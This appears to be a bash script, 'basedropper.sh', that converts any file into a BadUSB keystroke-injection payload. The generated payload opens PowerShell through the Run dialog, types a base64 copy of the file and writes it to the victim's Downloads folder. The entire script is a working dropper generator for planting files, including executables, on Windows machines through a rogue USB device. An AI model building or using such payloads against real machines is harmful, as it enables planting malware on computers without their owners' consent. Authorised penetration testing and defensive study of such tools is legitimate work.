#!/bin/bash

# Setting colors
RED='\033[0;31m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

clear

# Time for some good ol' fashioned ASCII art

echo  ""
echo -e "${RED}                                                     @   @                     "
echo -e "                                                     @   @ @                   "
echo -e "                                                     @@@ @@@@                  "
echo -e "${BLUE}   @@@@@@@@@@           @@@@         @@@@@@   @@@@@@ ${RED}@ @   @                   "
echo -e "${BLUE}  @@@@@@@@@@@@         -@@@@        @@@ @@@  @@* @@@ ${RED}@@@   @                   "
echo -e "${BLUE}           @@@         @ @@         @@+ @@@  @@  @@@                           "
echo -e "     @@@   @@@        @@%@@         @@@      @@@                               "
echo -e "     @@   @@         @@ @@@         @@@     @@@@@                              "
echo -e "    @@@@@@@.   @@@@@@@@@@@@@@@@@@@@  @@+  @@@@                                 "
echo -e "    @@@  @@@       #@  @@@     @@@   @@@  @@@                                  "
echo -e "   @@@    @@@     #@   @@@      =#  -@@    @@@   **                             "
echo -e " ${PURPLE}@@@@@@@@@${BLUE}@@   ${PURPLE}@@@@@@@ ${BLUE}@@   ${PURPLE}@@@@@@@${BLUE}#@@-  ${PURPLE}@@@@@@${BLUE}@@@ ${PURPLE}@@@@@@    @@@@@@  @@@@@@@   "
echo -e " @@@@@@@@@@  @@@@@@@@@@   .@@@@@@@@%    @@@@@@@%  @@@@@@@%  @@@@@@@  @@@@@@@@  "
echo -e " @@@@@@@@@@@   @@@@@@@@@  @@@@@@@@@@@  -@@@@@@@@ -@@@@@@@@  @@@@@@@  @@@@@@@@@ "
echo -e " @@@@   @@@@@  @@@  @@@@ @@@@@   @@@@  @@@@  @@@ @@@@  @@@  @@@=     @@@  @@@@ "
echo -e " @@@@    @@@@  @@@  @@@@ @@@@     @@@@ @@@@ @@@@ @@@@ @@@@  @@@@@@   @@@  @@@@ "
echo -e " @@@@    @@@@  @@@ @@@@% @@@@     @@@@ @@@@ @@@@ @@@@ @@@@  @@@@@@   @@@ @@@@% "
echo -e " @@@@    @@@@  @@@ @@@@  @@@@     @@@@ @@@@ @@@- @@@@ @@@-  @@@@@@   @@@ @@@@  "
echo -e " @@@@    @@@@  @@@ @@@@  @@@@%   @@@@- @@@@ @%   @@@@ @%    @@@      @@@ @@@@  "
echo -e " @@@@*@@@@@@   @@@ @@@@  @@@@@@%@@@@@  @@@@      @@@@       @@@@@@@  @@@ @@@@  "
echo -e " @@@@*@@@@@@   @@@ -@@@=  @@@@@@@@@@+  @@@@      @@@@       @@@@@@@  @@@ -@@@= "
echo -e " @@@@*@@@@@    @@@  @@@@   @@@@@@@@@   @@@@      @@@@       @@@@@@@  @@@  @@@@ "
echo -e " @@@@*@@@      @@@  @@@@    *@@@@@     @@@@      @@@@         @@@@@  @@@  @@@@ "
echo  ""
echo -e "${PURPLE}[${RED}+${PURPLE}] ${BLUE}Dropping the base${NC}"

# Sets source variable for executable to convert
source=$1

# Sets destination variable for where to create badusb file
destination=$2

# Check to see if a source was provided
if [ ! -r "$source" ];then
	echo ""
	echo -e "${RED}ERROR:${NC} You are missing a source file"
	echo ""
	echo "Proper format: ./basedropper.sh /path/to/source/file /path/to/created/file"
	echo ""
	exit 1
fi

# Stripping source filename from path
sourcefile=$(basename $source)

# Check to see if a creation destination was provided
if [ -z "$destination" ];then
	echo ""
	echo -e "${RED}ERROR:${NC} You are missing a creation destination"
	echo ""
	echo "Proper format: ./basedropper.sh /path/to/source/file /path/to/created/file"
	echo ""
	exit 1
fi

# Check to see if destination provided was a directory
if [ -d "$destination" ];then
	echo ""
	echo -e "${RED}ERROR:${NC} You have included a creation directory but not a filename"
	echo ""
	echo "Proper format: ./basedropper.sh /path/to/source/file /path/to/created/file"
	echo ""
	exit 1
fi

# Stripping destination filename from path
destinationfile=$(basename $destination)

# Checking if destination path has a filename
if [ -z "$destinationfile" ];then
        echo ""
        echo -e "${RED}ERROR:${NC} You have included a creation directory but not a filename"
        echo ""
        echo "Proper format: ./basedropper.sh /path/to/source/file /path/to/created/file"
        echo ""
        exit 1
fi

# Converting source file into base64 string
generation=$(base64 -w0 $source)

# Writing badusb file
echo "REM This will convert a saved base64 string to a file">$destination
echo "">>$destination
echo "REM Opening PowerShell">>$destination
echo "DELAY 750">>$destination
echo "GUI r">>$destination
echo "DELAY 500">>$destination
echo "STRING powershell">>$destination
echo "DELAY 500">>$destination
echo "ENTER">>$destination
echo "DELAY 750">>$destination
echo "">>$destination
echo "REM Spitting out the base64, get ready to wait">>$destination
echo "STRING \$base64 = '"$generation"'">>$destination
echo "ENTER">>$destination
echo "">>$destination
echo "REM If you want it to create in a different directory, set it here">>$destination
echo "STRING \$filename = \"C:\\Users\\\$env:UserName\\Downloads\\"$sourcefile"\"">>$destination
echo "ENTER">>$destination
echo "STRING \$convert = [Convert]::FromBase64String(\$base64)">>$destination
echo "ENTER">>$destination
echo "STRING [IO.File]::WriteAllBytes(\$filename, \$convert)">>$destination
echo "ENTER">>$destination

# Returning location to console
echo "Your file is located at" $destination
exit 0
